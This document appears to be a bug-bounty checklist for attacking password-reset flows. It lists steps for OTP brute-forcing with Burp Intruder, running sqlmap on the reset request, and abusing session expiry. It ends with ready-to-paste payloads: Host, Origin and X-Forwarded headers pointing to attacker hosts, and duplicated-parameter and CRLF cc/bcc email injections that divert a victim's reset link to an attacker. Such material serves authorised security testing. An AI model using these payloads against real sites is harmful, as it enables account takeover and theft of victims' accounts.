

## 1-check if there is rate limit over sending the reset password link to your email , if not then it will lead to

#### ➢ Email bombing

#### ➢ Resource Consumption

#### ➢ Stress over the smtp server and cost a lot of money


## 2-Check if the token is sent over http or https as if the token sent to you email (HTTP) would lead to :

#### ➢ Man in the middle attack to steal token

#### ➢ Permit sites to index and capture the token from the site which would lead to account takeover (as waybackmachine…)


## 3-exposed token

#### ➢ send reset password

#### ➢ copy token and search in burp history

#### ➢ If found the token is exposed in any other site than your gmail then vulnerability



## 4-Check if the OTP or the request is exposed in request or response

#### ➢ Can lead to bypass authentication and account takeover


## 5-Improper session Expiration

#### ➢ ask reset password (from out) don’t press on it

#### ➢ login to account

#### ➢ change the email and verify

#### ➢ click on reset link

#### ➢ if password changed through reset password link (bug)


## 6-Improper Session Expiration

#### ➢ ask reset password (from out) don’t press on it

#### ➢ login to account

#### ➢ change the password

#### ➢ click on reset link

#### ➢ if password changed through reset password link (bug)


## 7-bypass reset password functionality

#### ➢ reset the password or ask for reset code

#### ➢ don't click or reload the page

#### ➢ go to /profile or /account or /my-profile or /home directly and see if you can access


## 8-brute force OTP lead to account takeover

#### ➢ Ask reset password OTP

#### ➢ Put any number and intercept the request with burpsuite

#### ➢ Send it to intruder or turbo intruder

#### ➢ Choose payload as numbers and then brute force the OTP

#### ➢ Once you found it then you can takeover any account



## 9-Reset password does not end all live sessions

#### ➢ Login to your account with two browsers (chrome, firefox)

#### ➢ Ask for new passowrd in chrome and change the password

#### ➢ Go back to firefox and see if the session expired and logout out or not

#### ➢ If not then (vulnerability )



## 10-SQL injection via reset password code

#### ➢ Ask for reset password

#### ➢ Put any code inside the input

#### ➢ Take the full request and put it into file(request.txt)

#### ➢ Use # sqlmap –r request.txt



## 11-Find hidden parameters via reset password request

#### ➢ Use arjun to find hidden parameters inside the request

#### ➢ arjun -u https://site.com/resetpass.php  -m post



## 12-check if token is Guuidv1 to make sandwich attack

#### ➢Ask for reset password

#### ➢Go to your email and check the link token

#### ➢If it was GUUIDv1 then try to make sandwich attack
#### ▪70d589f4-93b6-==1==1ef-b864-0242ac120002



## 13-Reset password Token does not expire after 24 hours

#### ➢ Ask for reset password

#### ➢ Click on the link and reset the password

#### ➢ After a time click on the same link again and put new password

#### ➢ If the link is still working then (bug)


## Host Header injection :
### ##1 can use double Host
#### Host: target.com
#### Host: attacker.com
------------------------------
### ##2
#### GET https://victim.com/HTTP/1.1
#### Host: attacker.com
---
### ##3add one space before the second
#### Host: target.com
#### Host: attacker.com

### ##3 add space before the first
#### Host: attacker.com
#### Host: victim.com

### ##3 for amazon3
#### \x1dHost: evilbucket.com
#### Host: victim.com
----------------------
### ##4
#### Host: hacker.com?.victim.com

---
### ##5 combination
#### Host: wwwexample.com
--------------
### ##6
#### Host: hacker.com/example.com
-------------
### ##7
#### Host: mydomain.com%23@www.example.com

---
### ##8
#### Host: account.vicitm.com
#### => replace with
#### Host: hacker.com => failed
#### Host: account.hacker.com => success

---

### Origin Header Manipulation
#### Origin: hacker.com
#### Origin: https://burpcollab.com
#### Origin: hacker.com?.victim.com
#### Origin: example.com.hacker.com
#### Origin: wwwexample.com
#### Origin: hacker.com/example.com
#### Origin: mydomain.com%25%32%33@www.example.com
#### Origin: mydomain.com%23@www.example.com

---
### X-Forwarded & Referrer Tricks

#### Try:

##### - `X-Forwarded-Host: https://burpcollab.com`
    
##### - `X-Forwarded-For: https://burpcollab.com`
    
#### - Fake `Referer` values
    
##### → Check if server trusts forwarded headers in password reset flow

---

### IDOR via reset password

#### after clicking on link and put new password if found the email address on request then change it to victim email address
#### https://hackerone.com/reports/315879

### Email injection payloads

```json

{"email":"victim@mail.com","email":"attacker@mail.com"} {"email":"attacker@mail.com\nvictim@mail.com"}
{"email":"accA@mail.com\naccB@mail.com"}
{"email":"Victim@mail.com,attacker@mail.com","email":"Victim@mail.com"}
{"email":"Victim@mail.com","email":"Victim@mail.com%0Abcc:Attacker@mail.com"}
{"email":"Victim@mail.com","email":"Victim@mail.com,Attacker@mail.com"}
{"email":"Victim@mail.com;Attacker@mail.com","email":"Victim@mail.com"}
{"email":"Victim@mail.com","email":"Victim@mail.com;Attacker@mail.com"}
{"email":"Victim@mail.com%20Attacker@mail.com","email":"Victim@mail.com"}
{"email":"Victim@mail.com","email":"Victim@mail.com%20Attacker@mail.com"}
{"email":"Victim@mail.com%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
{"email":"Victim@mail.com","email":"Victim@mail.com%0Acc:Attacker@mail.com"}
{"email":"Victim@mail.com%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
{"email":"Victim@mail.com%0D%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
{"email":"Victim@mail.com%0D%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
{"email":"Victim@mail.com","email":"Victim@mail.com%0D%0Acc:Attacker@mail.com"}
{"email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
{"email":"Victim@mail.com","email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com"} {"email":"Victim@mail.com\r\n \ncc: Attacker@mail.com","email":"Victim@mail.com"}
{"email":"Victim@mail.com","email":"Victim@mail.com\r\n \ncc: Attacker@mail.com"} {"email":["victim@mail.com","attacker@mail.com"]}

email=victim@xyz.com&email=hacker@xyz.com
email=victim@xyz.com%0a%0dcc:hacker@xyz.com
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
email=victim@email.com%20email=attacker@email.com
email=victim@xyz.com,hacker@xyz.com
email="victim@xyz.com",email="hacker@xyz.com"

email=victim@xyz.com/ehacker@xyz.com
email=victim@xyz.com|hacker@xyz.com
email=victim => no domain
email=victim@xyz=> no tld
email=victim@gmail.com&code=123456 or put token
user[email][]=vicitm@gmail.com&user[email][]=hacker@gmail.com

```